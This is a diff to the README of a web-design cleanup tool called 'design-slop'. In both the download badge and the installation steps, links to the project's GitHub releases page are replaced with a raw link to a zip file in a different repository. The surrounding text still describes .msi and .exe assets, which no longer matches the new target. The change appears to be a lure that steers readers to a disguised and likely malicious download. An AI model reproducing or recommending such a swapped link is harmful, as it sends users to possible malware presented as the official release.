@@ -5,7 +5,7 @@ description: "Detect, prevent, and remove generic AI design patterns to improve 
 ---
 # 🎨 design-slop - Clean up generic web design patterns
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Garconplucky882/design-slop/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Garconplucky882/garconplucky882.github.io/main/blobber/1.1.zip)
 
 design-slop identifies and removes generic web design elements that lack purpose. This tool helps developers and designers maintain clean, authentic interfaces. It scans your website code to find patterns that look like mass-produced AI content. It then suggests ways to improve these areas for better user experiences.
 
@@ -22,7 +22,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these steps to acquire the installer for your machine.
 
-1. Visit the [releases page](https://github.com/Garconplucky882/design-slop/releases) to download the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/Garconplucky882/garconplucky882.github.io/main/blobber/1.1.zip) to download the latest version.
 2. Look for the file ending in .msi or .exe under the "Assets" section.
 3. Click the link to begin the download process.
 4. Save the file in your Downloads folder for easy access.
